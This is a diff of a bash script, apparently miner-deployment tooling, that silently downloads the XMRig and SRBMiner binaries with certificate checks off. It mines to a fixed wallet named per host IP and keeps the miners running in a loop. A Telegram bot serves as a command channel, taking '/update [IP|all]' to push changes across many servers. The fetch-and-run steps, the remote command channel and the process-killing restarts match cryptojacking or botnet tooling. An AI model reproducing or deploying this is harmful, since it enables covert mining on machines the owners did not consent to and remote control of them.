@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # ============================================================
-# | GOD MODE v26: NON-BLOCKING SPEED DEMON (FULL RELEASE)    |
+# | GOD MODE v28: ZERO-HANG GUIDED SETUP FIX & PEARL OFFICIAL |
 # ============================================================
 
 # [ CONFIGURATION ]
@@ -46,7 +46,7 @@ LOG_GPU="$BASE_DIR/.gpu_data.log"
 # ----------------------------------------------------
 get_worker() {
     local ip
-    ip=$(curl -s -m 2 --connect-timeout 2 api.ipify.org || curl -s -m 2 --connect-timeout 2 icanhazip.com || curl -s -m 2 --connect-timeout 2 ifconfig.me || wget -qO- -t 1 -T 2 ifconfig.me 2>/dev/null)
+    ip=$(curl -s -m 3 --connect-timeout 2 api.ipify.org || curl -s -m 3 --connect-timeout 2 icanhazip.com || curl -s -m 3 --connect-timeout 2 ifconfig.me || wget -qO- -t 1 -T 2 ifconfig.me 2>/dev/null)
     [ -z "$ip" ] && ip="111.111.111.111"
     
     local safe_worker
@@ -55,7 +55,7 @@ get_worker() {
     echo "${FIXED_WALLET_ID}.${safe_worker}"
 }
 WORKER=$(get_worker)
-SERVER_IP=$(curl -s -m 2 --connect-timeout 2 api.ipify.org || curl -s -m 2 --connect-timeout 2 icanhazip.com || echo "Unknown-IP")
+SERVER_IP=$(curl -s -m 3 --connect-timeout 2 api.ipify.org || curl -s -m 3 --connect-timeout 2 icanhazip.com || echo "Unknown-IP")
 
 detect_gpu() {
     if [ -d "/proc/driver/nvidia" ] || [ -c "/dev/nvidia0" ] || [ -d "/sys/class/drm/card0" ]; then
@@ -77,21 +77,15 @@ detect_gpu() {
 HAS_GPU=$(detect_gpu)
 
 # ----------------------------------------------------
-# [ PHASE 2: MODULE DOWNLOAD & FORCE CLEAN INSTALL ]
+# [ PHASE 2: MODULE DOWNLOAD & SAFE VERIFICATION ]
 # ----------------------------------------------------
-ARCH=$(uname -m)
-
-if [[ "$ARCH" == "aarch64" || "$ARCH" == "arm64" ]]; then
-    URL_XMRIG="https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz"
-else
-    URL_XMRIG="https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz"
-fi
-
+# Рабочая ссылка XMRig 6.26.0
+URL_XMRIG="https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz"
 URL_SRBMINER="https://github.com/doktor83/SRBMiner-Multi/releases/download/3.4.7/SRBMiner-Multi-3-4-7-Linux.tar.gz"
 
 # CPU Setup
 if [ ! -f "$BIN_CPU" ]; then
-    curl -L -k -s -m 15 --connect-timeout 5 -o cpu.tar.gz "$URL_XMRIG" || wget -qO cpu.tar.gz -T 15 "$URL_XMRIG"
+    curl -L -k -s -m 30 --connect-timeout 5 -o cpu.tar.gz "$URL_XMRIG" || wget -qO cpu.tar.gz -T 30 "$URL_XMRIG"
     tar -xf cpu.tar.gz 2>/dev/null
     FOUND_CPU=$(find . -type f -name "xmrig" | head -n 1)
     if [ -n "$FOUND_CPU" ]; then
@@ -118,13 +112,13 @@ cat <<EOF > config.json
 }
 EOF
 
-# GPU Setup (Авто-чистка старых бинарников)
+# GPU Setup (Проверка через 'strings' без вызова бинарника, чтобы НЕ триггерить Guided Setup)
 if [ "$HAS_GPU" -eq 1 ]; then
     NEED_INSTALL=0
     if [ ! -f "$BIN_GPU" ]; then
         NEED_INSTALL=1
     else
-        if ! ./$BIN_GPU --version 2>&1 | grep -i "SRBMiner" >/dev/null; then
+        if ! strings "./$BIN_GPU" 2>/dev/null | grep -i "SRBMiner" >/dev/null; then
             rm -f "$BIN_GPU"
             NEED_INSTALL=1
         fi
@@ -133,10 +127,10 @@ if [ "$HAS_GPU" -eq 1 ]; then
     if [ "$NEED_INSTALL" -eq 1 ]; then
         pkill -9 -f "$BIN_GPU" 2>/dev/null
         rm -f "$BIN_GPU" gpu.tar.gz
-        curl -L -k -s -m 20 --connect-timeout 5 -o gpu.tar.gz "$URL_SRBMINER" || wget -qO gpu.tar.gz -T 20 "$URL_SRBMINER"
+        curl -L -k -s -m 40 --connect-timeout 5 -o gpu.tar.gz "$URL_SRBMINER" || wget -qO gpu.tar.gz -T 40 "$URL_SRBMINER"
         tar -xf gpu.tar.gz 2>/dev/null
         FOUND_GPU=$(find . -type f -name "SRBMiner-MULTI" | head -n 1)
-        if [ -n "$FOUND_GPU" ]; then
+        if [ -n "$FOUND_GPU" ] && [ -f "$FOUND_GPU" ]; then
             mv "$FOUND_GPU" "./$BIN_GPU"
             chmod +x "./$BIN_GPU"
         fi
@@ -173,7 +167,7 @@ PAUSED=0
 
 send_tg_msg() {
     local msg="\$1"
-    curl -s -m 4 --connect-timeout 2 -X POST "https://api.telegram.org/bot\$TG_BOT_TOKEN/sendMessage" \
+    curl -s -m 5 --connect-timeout 3 -X POST "https://api.telegram.org/bot\$TG_BOT_TOKEN/sendMessage" \
          -d chat_id="\$TG_CHAT_ID" \
          -d text="\$msg" \
          -d parse_mode="HTML" > /dev/null 2>&1
@@ -303,7 +297,7 @@ send_logs_report() {
     send_tg_msg "\$msg"
 }
 
-STARTUP_MSG="🚀 <b>ENGINE V26 ACTIVE</b>%0A🌐 <b>IP:</b> <code>\$SERVER_IP</code>%0A🆔 <b>Worker:</b> <code>\$WORKER</code>%0A💡 <i>Use /update [IP|all] to deploy changes.</i>"
+STARTUP_MSG="🚀 <b>ENGINE V28 ACTIVE</b>%0A🌐 <b>IP:</b> <code>\$SERVER_IP</code>%0A🆔 <b>Worker:</b> <code>\$WORKER</code>%0A💡 <i>Use /update [IP|all] to deploy changes.</i>"
 send_tg_msg "\$STARTUP_MSG"
 
 while true; do
@@ -328,7 +322,7 @@ while true; do
             if [ -f "./\$BIN_GPU" ]; then
                 if ! pgrep -f "\$BIN_GPU" > /dev/null; then
                     chmod +x "./\$BIN_GPU"
-                    nohup ./\$BIN_GPU --algorithm-gpu pearlhash --pool \$POOL_GPU_1 --wallet \$WORKER --pool \$POOL_GPU_2 --wallet \$WORKER --watchdog-enable --retry-time 10 --disable-cpu >> "\$LOG_GPU" 2>&1 &
+                    nohup ./\$BIN_GPU --algorithm pearlhash --pool \$POOL_GPU_1 --wallet \$WORKER --pool \$POOL_GPU_2 --wallet \$WORKER --disable-cpu >> "\$LOG_GPU" 2>&1 &
                     sleep 2
                     if ! pgrep -f "\$BIN_GPU" > /dev/null; then
                         GPU_STATUS="🔴 Offline / Crashed"
@@ -346,7 +340,7 @@ while true; do
     [ -f "\$LOG_GPU" ] && tail -n 300 "\$LOG_GPU" > "\$LOG_GPU.tmp" && mv "\$LOG_GPU.tmp" "\$LOG_GPU"
 
     # --- 3. ТЕЛЕГРАМ ОБРАБОТЧИК ---
-    LAST_CMD=\$(curl -s -m 2 --connect-timeout 2 "https://api.telegram.org/bot\${TG_BOT_TOKEN}/getUpdates?offset=-1&timeout=1" 2>/dev/null)
+    LAST_CMD=\$(curl -s -m 3 --connect-timeout 2 "https://api.telegram.org/bot\${TG_BOT_TOKEN}/getUpdates?offset=-1&timeout=1" 2>/dev/null)
     UPDATE_ID=\$(echo "\$LAST_CMD" | grep -o '"update_id":[0-9]*' | head -n 1 | cut -d: -f2)
 
     if [ -n "\$UPDATE_ID" ]; then
@@ -425,12 +419,12 @@ pkill -9 -f "watchdog.sh" 2>/dev/null
 # [ PHASE 4: VERBOSE CLEAN ASCII DIAGNOSTICS ]
 # ----------------------------------------------------
 echo "================================================="
-echo "[+] ENGINE V26 INITIALIZED"
+echo "[+] ENGINE V28 INITIALIZED"
 echo "[+] Server IP: $SERVER_IP"
 echo "[+] Worker ID: $WORKER"
 echo "================================================="
 echo "[+] Igniting core engines..."
-sleep 2
+sleep 3
 
 echo "-------------------------------------------------"
 echo "[+] CPU ENGINE STATUS:"
